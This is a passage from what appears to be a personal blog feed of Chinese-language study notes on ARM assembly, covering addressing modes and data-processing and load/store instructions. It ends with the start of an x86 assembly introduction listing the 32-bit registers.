<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>,<span class="meta">#15       #15就是立即数</span></div></pre></td></tr></table></figure>
<p>b.寄存器寻址</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ADD </span><span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="built_in">R2</span>    将<span class="built_in">R1</span>和<span class="built_in">R2</span>的内容相加，其结果存放在寄存器<span class="built_in">R0</span>中</div></pre></td></tr></table></figure>
<p>c.寄存器间接寻址</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">LDR </span><span class="built_in">R0</span>, [<span class="built_in">R4</span>]      以寄存器<span class="built_in">R4</span>的值作为操作数的地址，在存储器中取得一个操作数存入寄存器<span class="built_in">R0</span>中</div></pre></td></tr></table></figure>
<p>d.寄存器移位寻址</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ADD </span><span class="built_in">R0</span>,<span class="built_in">R1</span>,<span class="built_in">R2</span>,<span class="keyword">LSL </span><span class="number">#1</span>    将<span class="built_in">R2</span>的值左移一位，所得值与<span class="built_in">R1</span>相加，存放到<span class="built_in">R0</span>中</div><div class="line"><span class="keyword">MOV </span><span class="built_in">R0</span>,<span class="built_in">R1</span>,<span class="keyword">LSL </span><span class="built_in">R3</span>       将<span class="built_in">R1</span>的值左移<span class="built_in">R3</span>位，然后将结果存放到<span class="built_in">R0</span>中</div></pre></td></tr></table></figure>
<p>e.基址变址寻址</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">LDR </span><span class="built_in">R0</span>,[<span class="built_in">R1</span>,<span class="number">#4</span>]    将<span class="built_in">R1</span>的值加<span class="number">4</span>作为操作数的地址，在存储器中取得操作数放入<span class="built_in">R0</span>中</div><div class="line"><span class="keyword">LDR </span><span class="built_in">R0</span>,[<span class="built_in">R1</span>,<span class="number">#4</span>]!   将<span class="built_in">R1</span>的值加<span class="number">4</span>作为操作数的地址，在存储器中取得操作数放入<span class="built_in">R0</span>中,然后<span class="built_in">R1</span> = <span class="built_in">R1</span>+<span class="number">4</span></div><div class="line"><span class="keyword">LDR </span><span class="built_in">R0</span>,[<span class="built_in">R1</span>],<span class="number">#4</span>    <span class="built_in">R0</span> = [<span class="built_in">R1</span>],<span class="built_in">R1</span> = <span class="built_in">R1</span> +<span class="number">4</span></div><div class="line"><span class="keyword">LDR </span><span class="built_in">R0</span>,[<span class="built_in">R1</span>,<span class="built_in">R2</span>]    <span class="built_in">R0</span> = [<span class="built_in">R1</span>+<span class="built_in">R2</span>]</div></pre></td></tr></table></figure>
<p>f.多寄存器寻址</p>
<p>一条指令可以完成多个寄存器值的传送(最多可传送16个通用寄存器)，连续的寄存器用“-”，否则用“，”</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">LDMIA </span><span class="built_in">R0</span>!,&#123;<span class="built_in">R1</span> - <span class="built_in">R4</span>&#125;   <span class="built_in">R1</span> = [<span class="built_in">R0</span>],<span class="built_in">R2</span>=[<span class="built_in">R0</span>+<span class="number">4</span>],<span class="built_in">R3</span>=[<span class="built_in">R0</span>+<span class="number">8</span>],<span class="built_in">R4</span>=[<span class="built_in">R0</span>+<span class="number">12</span>]</div></pre></td></tr></table></figure>
<p>后缀IA表示在每次执行玩加载/存储操作后，R0按自长度增加。<br>g.相对寻址</p>
<p>以程序计数器PC的当前值为基地址，指令中的地址标号作为偏移量，将两者相加之后得到操作数的有效地址，如下图的BL分支跳转</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">     <span class="keyword">BL </span><span class="meta">proc</span>        跳转到子程序<span class="meta">proc</span>处执行</div><div class="line">     ...</div><div class="line"><span class="symbol">proc</span> <span class="keyword">MOV </span><span class="built_in">R0</span>,<span class="number">#1</span></div><div class="line">     ...</div></pre></td></tr></table></figure>
<p>h.堆栈寻址</p>
<p>按先进先出的方式工作，堆栈指针用R13表示，总是指向栈顶，LDMFD和STMFD分别表示POP出栈和PUSH进栈</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">STMFD </span><span class="built_in">R13</span>!,&#123;<span class="built_in">R0</span> - <span class="built_in">R4</span>&#125;<span class="comment">;</span></div><div class="line"><span class="keyword">LDMFD </span><span class="built_in">R13</span>!,&#123;<span class="built_in">R0</span> - <span class="built_in">R4</span>&#125;<span class="comment">;</span></div></pre></td></tr></table></figure>
<h2 id="数据处理指令"><a href="#数据处理指令" class="headerlink" title="数据处理指令"></a>数据处理指令</h2><p>a. MOV指令</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">MOV </span>&#123;&lt;cond&gt;&#125;&#123;S&#125; Rd,op2          将op2传给Rd</div><div class="line"><span class="keyword">MOV </span><span class="built_in">R1</span>, <span class="built_in">R0</span>                      将寄存器<span class="built_in">R0</span>的值传到寄存器<span class="built_in">R1</span></div><div class="line"><span class="keyword">MOV </span><span class="built_in">PC</span>,<span class="built_in">R14</span>                      将寄存器<span class="built_in">R14</span>的值传到<span class="built_in">PC</span>，常用于子程序返回</div><div class="line"><span class="keyword">MOV </span><span class="built_in">R1</span>,<span class="built_in">R0</span>,<span class="keyword">LSL </span><span class="number">#3</span>                将寄存器<span class="built_in">R0</span>的值左移<span class="number">3</span>位后传给<span class="built_in">R1</span></div><div class="line"><span class="keyword">MOV </span><span class="built_in">R0</span>,<span class="number">#5</span>                       将立即数<span class="number">5</span>传给<span class="built_in">R0</span></div></pre></td></tr></table></figure>
<p>b. MVN指令</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">MVN </span>&#123;&lt;cond&gt;&#125;&#123;S&#125;Rd, op2          将op2取反传给Rd</div><div class="line"><span class="keyword">MVN </span><span class="built_in">R0</span>,<span class="number">#0</span>                       将<span class="number">0</span>取反后传给<span class="built_in">R0</span>，<span class="built_in">R0</span> = -<span class="number">1</span></div><div class="line"><span class="keyword">MVN </span><span class="built_in">R1</span>,<span class="built_in">R2</span>                       将<span class="built_in">R2</span>取反，结果保存到<span class="built_in">R1</span></div></pre></td></tr></table></figure>
<p>c. 移位指令</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">LSL </span>逻辑左移</div><div class="line"><span class="keyword">LSR </span>逻辑右移</div><div class="line"><span class="keyword">ASR </span>算术右移</div><div class="line"><span class="keyword">ROR </span>循环右移</div><div class="line"><span class="keyword">RRX </span>带扩展的循环右移</div></pre></td></tr></table></figure>
<p>d. ADD加法指令</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ADD&#123;&lt;cond&gt;&#125;&#123;S&#125;Rd, </span>Rn, op2</div><div class="line"><span class="keyword">ADD </span><span class="built_in">R0</span>,<span class="built_in">R1</span>,<span class="built_in">R2</span>            <span class="built_in">R0</span> = <span class="built_in">R1</span> + <span class="built_in">R2</span></div><div class="line"><span class="keyword">ADD </span><span class="built_in">R0</span>,<span class="built_in">R1</span>,<span class="number">#5</span>            <span class="built_in">R0</span> = <span class="built_in">R1</span> + <span class="number">5</span></div><div class="line"><span class="keyword">ADD </span><span class="built_in">R0</span>,<span class="built_in">R1</span>,<span class="built_in">R2</span>,<span class="keyword">LSL </span><span class="number">#2</span>     <span class="built_in">R0</span> = <span class="built_in">R1</span> + (<span class="built_in">R2</span>左移<span class="number">2</span>位)</div></pre></td></tr></table></figure>
<p>e. ADC带进位加法指令</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ADC</span>&#123;&lt;cond&gt;&#125;&#123;S&#125; Rd,Rn,op2    将Rn的值和操作数op2相加，再加上CPSR中C条件标志位的值，并将结果保存到Rd中</div><div class="line">例：用<span class="keyword">ADC</span>完成<span class="number">64</span>位加法，设第一个<span class="number">64</span>位操作数保存在<span class="built_in">R2</span>,<span class="built_in">R3</span>中，第二个<span class="number">64</span>位操作数放在<span class="built_in">R4</span>,<span class="built_in">R5</span>中，结果保存在<span class="built_in">R0</span>,<span class="built_in">R1</span>中</div><div class="line">ADDS <span class="built_in">R0</span>,<span class="built_in">R2</span>,<span class="built_in">R4</span>               低<span class="number">32</span>位相加，产生进位</div><div class="line"><span class="keyword">ADC</span> <span class="built_in">R1</span>,<span class="built_in">R3</span>,<span class="built_in">R5</span>                高<span class="number">32</span>位相加，加上进位</div></pre></td></tr></table></figure>
<p>f. SUB减法指令</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SUB&#123;&lt;cond&gt;&#125;&#123;S&#125; </span>Rd,Rn,op2    Rd = Rn - op2</div><div class="line"><span class="keyword">SUB </span><span class="built_in">R0</span>,<span class="built_in">R1</span>,<span class="built_in">R2</span>                <span class="built_in">R0</span> = <span class="built_in">R1</span> - <span class="built_in">R2</span></div><div class="line"><span class="keyword">SUB </span><span class="built_in">R0</span>,<span class="built_in">R1</span>,<span class="number">#6</span>                <span class="built_in">R0</span> = <span class="built_in">R1</span> -<span class="number">6</span></div><div class="line"><span class="keyword">SUB </span><span class="built_in">R0</span>,<span class="built_in">R2</span>,<span class="built_in">R3</span>,<span class="keyword">LSL </span><span class="number">#1</span>         <span class="built_in">R0</span> = <span class="built_in">R2</span> - (<span class="built_in">R3</span>左移<span class="number">1</span>位)</div></pre></td></tr></table></figure>
<p>g. SBC带借位减法指令</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SBC&#123;&lt;cond&gt;&#125;&#123;S&#125; Rd,Rn,op2    把Rn的值减去操作数op2，再减去CPSR中的<span class="keyword">C</span>标志位的反码，并将结果保存到Rd中，Rd = Rn - op2 - !<span class="keyword">C</span></div></pre></td></tr></table></figure>
<p>例:用SBC完成64位减法，设第一个64位操作数保存在R2,R3中，第二个64位操作数放在R4,R5中，结果保存在R0,R1中</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SUBS </span><span class="built_in">R0</span>,<span class="built_in">R2</span>,<span class="built_in">R4</span>       低<span class="number">32</span>位相减，S影响<span class="keyword">CPSR</span></div><div class="line"><span class="keyword">SBC </span><span class="built_in">R1</span>,<span class="built_in">R3</span>,<span class="built_in">R5</span>        高<span class="number">32</span>位相减，去除C的反码</div></pre></td></tr></table></figure>
<p>h. RSC带借位的逆向减法指令</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">RSC&#123;&lt;cond&gt;&#125;&#123;S&#125; Rd,Rn,op2    把操作数op2减去Rn，再减去CPSR中的<span class="keyword">C</span>标志位的反码，并将结果保存到Rd中，Rd = op2 - Rn - !<span class="keyword">C</span></div></pre></td></tr></table></figure>
<p>i. 逻辑运算指令</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">AND&#123;&lt;cond&gt;&#125;&#123;S&#125; <span class="built_in">Rd</span>,Rn,op2    按位与，<span class="built_in">Rd</span> = Rn AND op2</div><div class="line">ORR&#123;&lt;cond&gt;&#125;&#123;S&#125; <span class="built_in">Rd</span>,Rn,op2    按位或，<span class="built_in">Rd</span> = Rn OR op2</div><div class="line">EOR&#123;&lt;cond&gt;&#125;&#123;S&#125; <span class="built_in">Rd</span>,Rn,op2    按位异或，<span class="built_in">Rd</span> = Rn EOR op2</div></pre></td></tr></table></figure>
<p>j. CMP比较指令</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CMP&#123;&lt;cond&gt;&#125;&#123;S&#125; </span>Rd,Rn,op2    将Rn的值和op2进行比较，同时更新<span class="keyword">CPSR中条件标志位的值(实际上是执行一次减法，但不存储结果)，当操作数Rn大于op2时，则此后带有GT后缀的指令将可以执行(根据相应的指令判断是否执行，如GT,LT等)。</span></div><div class="line"><span class="keyword">CMP </span><span class="built_in">R1</span>,<span class="number">#10</span>                  比较<span class="built_in">R1</span>和<span class="number">10</span>，并设置<span class="keyword">CPSR的标志位</span></div><div class="line"><span class="keyword">ADDGT </span><span class="built_in">R0</span>,<span class="built_in">R0</span>,<span class="number">#5</span>              如果<span class="built_in">R1</span>&gt;<span class="number">10</span>,则执行<span class="keyword">ADDGT指令，将R0加5</span></div></pre></td></tr></table></figure>
<p>k. CMN反值比较指令</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CMN&#123;&lt;cond&gt;&#125;&#123;S&#125; </span>Rd,Rn,op2    将Rn的值和op2取反后进行比较，同时更新<span class="keyword">CPSR中条件标志位的值(实际上将Rn和op2相加)，后面的指令就可以根据条件标志位决定是否执行。 </span> </div><div class="line"><span class="keyword">CMN </span><span class="built_in">R0</span>,<span class="built_in">R1</span>       将<span class="built_in">R0</span>和<span class="built_in">R1</span>相加，并设置<span class="keyword">CPSR的值</span></div></pre></td></tr></table></figure>
<p>l. MUL/MLA/SMULL/SMLAL/UMULL/UMLAL乘法指令</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">MUL </span>    <span class="number">32</span>位乘法指令</div><div class="line"><span class="keyword">MLA </span>    <span class="number">32</span>位乘加指令</div><div class="line"><span class="keyword">SMULL </span>  <span class="number">64</span>位有符号数乘法指令</div><div class="line"><span class="symbol">SMLAL</span>   <span class="number">64</span>位有符号数乘加指令</div><div class="line"><span class="keyword">UMULL </span>  <span class="number">64</span>位无符号数乘法指令</div><div class="line"><span class="symbol">UMLAL</span>   <span class="number">64</span>位无符号数乘加指令</div><div class="line"><span class="keyword">MUL&#123;&lt;cond&gt;&#125;&#123;S&#125; </span>Rd,Rm,Rs         Rd = Rm * Rs</div><div class="line"><span class="keyword">MULS </span><span class="built_in">R0</span>,<span class="built_in">R1</span>,<span class="built_in">R2</span></div><div class="line"><span class="keyword">MLA&#123;&lt;cond&gt;&#125;&#123;S&#125; </span>Rd,Rm,Rs,Rn      Rd = (Rm * Rs) + Rn</div><div class="line"><span class="keyword">MLAS </span><span class="built_in">R0</span>,<span class="built_in">R1</span>,<span class="built_in">R2</span>,<span class="built_in">R3</span></div></pre></td></tr></table></figure>
<h2 id="数据加载与存储指令"><a href="#数据加载与存储指令" class="headerlink" title="数据加载与存储指令"></a>数据加载与存储指令</h2><p><img src="/images/arm/arm2.png" alt=""></p>
<p>a. LDR/STR字数据加载/存储指令</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">LDR/STR&#123;&lt;cond&gt;&#125;&#123;T&#125;Rd,addr </span>      <span class="keyword">LDR指令用于从存储器中将一个32位的字数据加载到目的寄存器Rd中，当程序计数器PC作为目的寄存器时，指令从存储器中读取的字数据被当做目的地址，从而可以实现程序流程的跳转。</span></div><div class="line"><span class="keyword">STR指令用于从源寄存器中将一个32位的字数据存储到存储器中，和LDR相反。后缀T可选。</span></div><div class="line"><span class="keyword">LDR </span><span class="built_in">R4</span>,START            将存储地址为START的字数据读入<span class="built_in">R4</span></div><div class="line"><span class="keyword">STR </span><span class="built_in">R5</span>,DATA1            将<span class="built_in">R5</span>存入存储地址为DATA1中</div><div class="line"><span class="keyword">LDR </span><span class="built_in">R0</span>,[<span class="built_in">R1</span>]             将存储器地址为<span class="built_in">R1</span>的字数据读入存储器<span class="built_in">R0</span></div><div class="line"><span class="keyword">LDR </span><span class="built_in">R0</span>,[<span class="built_in">R1</span>,<span class="built_in">R2</span>]          将存储器地址为<span class="built_in">R1</span>+<span class="built_in">R2</span>的字数据读入存储器<span class="built_in">R0</span></div><div class="line"><span class="keyword">LDR </span><span class="built_in">R0</span>,[<span class="built_in">R1</span>,<span class="number">#8</span>]          将存储器地址为<span class="built_in">R1</span>+<span class="number">8</span>的字数据读入存储器<span class="built_in">R0</span></div><div class="line"><span class="keyword">LDR </span><span class="built_in">R0</span>,[<span class="built_in">R1</span>,<span class="built_in">R2</span>,<span class="keyword">LSL </span><span class="number">#2</span>]   将存储器地址为<span class="built_in">R1</span>+<span class="built_in">R2</span>*<span class="number">4</span>的字数据读入存储区<span class="built_in">R0</span></div><div class="line"><span class="keyword">STR </span><span class="built_in">R0</span>,[<span class="built_in">R1</span>,<span class="built_in">R2</span>]!         将<span class="built_in">R0</span>字数据存入存储器地址<span class="built_in">R1</span>+<span class="built_in">R2</span>的存储单元中，并将新地址<span class="built_in">R2</span>+<span class="built_in">R2</span>写入<span class="built_in">R2</span></div><div class="line"><span class="keyword">STR </span><span class="built_in">R0</span>,[<span class="built_in">R1</span>,<span class="number">#8</span>]!         将<span class="built_in">R0</span>字数据存入存储器地址<span class="built_in">R1</span>+<span class="number">8</span>的存储单元中，并将新地址<span class="built_in">R2</span>+<span class="number">8</span>写入<span class="built_in">R2</span></div><div class="line"><span class="keyword">STR </span><span class="built_in">R0</span>,[<span class="built_in">R1</span>,<span class="built_in">R2</span>,<span class="keyword">LSL </span><span class="number">#2</span>]   将<span class="built_in">R0</span>字数据存入存储器地址<span class="built_in">R1</span>+<span class="built_in">R2</span>*<span class="number">4</span>的存储单元中，并将新地址<span class="built_in">R2</span>+<span class="built_in">R2</span>*<span class="number">4</span>写入<span class="built_in">R1</span></div><div class="line"><span class="keyword">LDR </span><span class="built_in">R0</span>,[<span class="built_in">R1</span>],<span class="number">#8</span>          将存储器地址为<span class="built_in">R1</span>的字数据读入寄存器<span class="built_in">R0</span>，并将新地址<span class="built_in">R1</span>+<span class="number">8</span>写入<span class="built_in">R1</span>  </div><div class="line"><span class="keyword">LDR </span><span class="built_in">R0</span>,[<span class="built_in">R1</span>],<span class="built_in">R2</span>          将存储器地址为<span class="built_in">R1</span>的字数据读入寄存器<span class="built_in">R0</span>，并将新地址<span class="built_in">R1</span>+<span class="built_in">R2</span>写入<span class="built_in">R1</span></div><div class="line"><span class="keyword">LDR </span><span class="built_in">R0</span>,[<span class="built_in">R1</span>],<span class="built_in">R2</span>,<span class="keyword">LSL </span><span class="number">#2</span>   将存储器地址为<span class="built_in">R1</span>的字数据读入寄存器<span class="built_in">R0</span>，并将新地址<span class="built_in">R1</span>+<span class="built_in">R2</span>*<span class="number">4</span>写入<span class="built_in">R1</span></div></pre></td></tr></table></figure>
<p>b. LDRB/STRB字节数据加载/存储指令</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">LDRB/STRB&#123;&lt;cond&gt;&#125;&#123;T&#125;Rd,addr         </div><div class="line">LDRB指令用于从存储器中将一个<span class="number">8</span>位的字节数据加载到目的寄存器中，同时将寄存器的高<span class="number">24</span>位清零，当程序计数器PC作为目的寄存器时，指令从存储器中读取的字数据被当做目的地址，从而可以实现程序流程的跳转。</div><div class="line">STRB指令用于从源寄存器中将一个<span class="number">8</span>位的字节数据存储到存储器中，和LDRB相反。后缀T可选。</div></pre></td></tr></table></figure>
<p>c. LDRH/STRH半字数据加载/存储指令</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">LDRH/STRH&#123;&lt;cond&gt;&#125;&#123;T&#125;Rd,addr         </div><div class="line">LDRH指令用于从存储器中将一个<span class="number">16</span>位的半字数据加载到目的寄存器中，同时将寄存器的高<span class="number">16</span>位清零，当程序计数器PC作为目的寄存器时，指令从存储器中读取的字数据被当做目的地址，从而可以实现程序流程的跳转。</div><div class="line">STRH指令用于从源寄存器中将一个<span class="number">16</span>位的半字数据存储到存储器中，和LDRH相反。后缀T可选。</div></pre></td></tr></table></figure>
<p>d. LDM/STM批量数据加载/存储指令</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="xml">LDM/STM</span><span class="template-variable">&#123;&lt;cond&gt;&#125;</span><span class="xml"></span><span class="template-variable">&#123;&lt;type&gt;&#125;</span><span class="xml">Rn</span><span class="template-variable">&#123;!&#125;</span><span class="xml">,<span class="tag">&lt;<span class="name">regs</span>&gt;</span></span><span class="template-variable">&#123;^&#125;</span><span class="xml">      </span></div><div class="line">LDM用于从基址寄存器所指示的一片连续存储器中读取数据到寄存器列表所指向的多个寄存器中，内存单元的起始地址为基址寄存器Rn的值，各个寄存器由寄存器列表regs表示，该指令一般用于多个寄存器数据的出栈操作</div><div class="line">STM用于将寄存器列表所指向的多个寄存器中的值存入由基址寄存器所指向的一片连续存储器中，内存单元的起始地址为基址寄存器Rn的值，各个寄存器又寄存器列表regs表示。该指令一般用于多个寄存器数据的进栈操作。</div></pre></td></tr></table></figure>
<p>type表示类型，用于数据的存储与读取有以下几种情况：</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">IA：每次传送后地址值加。</div><div class="line">IB：每次传送前地址值加。</div><div class="line"><span class="symbol">DA:</span> 每次传送后地址值减。</div><div class="line"><span class="symbol">DB:</span> 每次传送前地址值减。</div></pre></td></tr></table></figure>
<p>用于堆栈操作时有如下几种情况：</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">FD:</span>满递减堆栈</div><div class="line"><span class="symbol">ED:</span>空递减堆栈</div><div class="line"><span class="symbol">FA:</span>满递增堆栈</div><div class="line"><span class="symbol">EA:</span>空递增堆栈</div></pre></td></tr></table></figure>
<p>e. SWP字数据交换指令</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SWP&#123;&lt;cond&gt;&#125;&lt;Rd&gt;,&lt;Rm&gt;,[&lt;Rn&gt;] </span>    Rd = [Rn],[Rn] = Rm,当寄存器Rm和目的寄存器Rd为同一个寄存器时，指令交换该急促亲和存储器的内容</div><div class="line"><span class="keyword">SWP </span><span class="built_in">R0</span>,<span class="built_in">R1</span>,[<span class="built_in">R2</span>]                  <span class="built_in">R0</span> = [<span class="built_in">R2</span>],[<span class="built_in">R2</span>] = <span class="built_in">R1</span></div><div class="line"><span class="keyword">SWP </span><span class="built_in">R0</span>,<span class="built_in">R0</span>,[<span class="built_in">R1</span>]                  <span class="built_in">R0</span> = [<span class="built_in">R1</span>],[<span class="built_in">R1</span>] = <span class="built_in">R0</span></div><div class="line"><span class="keyword">SWPB指令用于将寄存器Rn指向的存储器中的字节数据加载到目的寄存器Rd中，目的寄存器的高24位清零，同时将Rm中的字数据存储到Rn指向的存储器中。</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ARM寄存器&quot;&gt;&lt;a href=&quot;#ARM寄存器&quot; class=&quot;headerlink&quot; title=&quot;ARM寄存器&quot;&gt;&lt;/a&gt;ARM寄存器&lt;/h1&gt;&lt;h2 id=&quot;通用寄存器&quot;&gt;&lt;a href=&quot;#通用寄存器&quot; class=&quot;headerlink&quot; title=&quot;通用寄存器&quot;&gt;&lt;/a&gt;通用寄存器&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;1)未分组寄存器:R0~R7 
2)分组寄存器:R8~812 
     R13:SP，常用作堆栈指针，始终指向堆栈的顶部，当一个数据(32位)推入堆栈时，SP(R13的值减4)向下浮动指向下一个地址，即新的栈顶，当数据从堆栈中弹出时，SP(R13的值加4)向上浮动指向新的栈顶。 
     R14:连接寄存器(LR),当执行BL子程序调用指令时，R14中得到R15(程序计数器PC)的备份，其他情况下，R14用作通用寄存器。   
     R15:程序计数器(PC):用于控制程序中指令的执行顺序。正常运行时，PC指向CPU运行的下一条指令。每次取值后PC的值会自动修改以指向下一条指令，从而保证了指令按一定的顺序执行。当程序的执行顺序发生改变(如转移)时，需要修改PC的值。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="Foundation" scheme="http://pwnable.me/tags/Foundation/"/>
    
  </entry>
  
  <entry>
    <title>汇编</title>
    <link href="http://pwnable.me/2017/01/03/%E6%B1%87%E7%BC%96/"/>
    <id>http://pwnable.me/2017/01/03/汇编/</id>
    <published>2017-01-03T00:58:08.000Z</published>
    <updated>2017-06-04T05:29:53.609Z</updated>
    
    <content type="html"><![CDATA[<h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><p>汇编语言（assembly language）是一种用于电子计算机、微处理器、微控制器或其他可编程器件的低级语言，亦称为符号语言。在汇编语言中，用助记符（Mnemonics）代替机器指令的操作码，用地址符号（Symbol）或标号（Label）代替指令或操作数的地址。在不同的设备中，汇编语言对应着不同的机器语言指令集，通过汇编过程转换成机器指令。普遍地说，特定的汇编语言和特定的机器语言指令集是一一对应的,不同平台之间不可直接移植。<br><a id="more"></a></p>
<p>汇编语言直接同计算机的底层软件甚至硬件进行交互，它具有如下一些优点：</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">能够直接访问与硬件相关的存储器或 <span class="keyword">I</span>/<span class="keyword">O</span> 端口；</div><div class="line">能够不受编译器的限制，对生成的二进制代码进行完全的控制；</div><div class="line">能够对关键代码进行更准确的控制，避免因线程共同访问或者硬件设备共享引起的死锁；</div><div class="line">能够根据特定的应用对代码做最佳的优化，提高运行速度；</div><div class="line">能够最大限度地发挥硬件的功能。</div></pre></td></tr></table></figure>
<p>同时还应该认识到，汇编语言是一种层次非常低的语言，它仅仅高于直接手工编写二进制的机器指令码，因此不可避免地存在一些缺点：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">编写的代码非常难懂，不好维护；</div><div class="line">很容易产生 <span class="keyword">bug，难于调试；</span></div><div class="line">只能针对特定的体系结构和处理器进行优化；</div><div class="line">开发效率很低，时间长且单调。</div></pre></td></tr></table></figure>
<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">32</span>位<span class="meta">CPU</span>所含有的寄存器有：</div><div class="line">    <span class="number">4</span>个数据寄存器(<span class="built_in">EAX</span>、<span class="built_in">EBX</span>、<span class="built_in">ECX</span>和<span class="built_in">EDX</span>)</div><div class="line">    <span class="number">2</span>个变址和指针寄存器(<span class="built_in">ESI</span>和<span class="built_in">EDI</span>) <span class="number">2</span>个指针寄存器(<span class="built_in">ESP</span>和<span class="built_in">EBP</span>)</div><div class="line">    <span class="number">6</span>个段寄存器(<span class="built_in">ES</span>、<span class="built_in">CS</span>、<span class="built_in">SS</span>、<span class="built_in">DS</span>、<span class="built_in">FS</span>和<span class="built_in">GS</span>)</div><div class="line">    <span class="number">1</span>个指令指针寄存器(<span class="built_in">EIP</span>) <span class="number">1</span>个标志寄存器(EFlags)</div></pre></td></tr></table></figure>
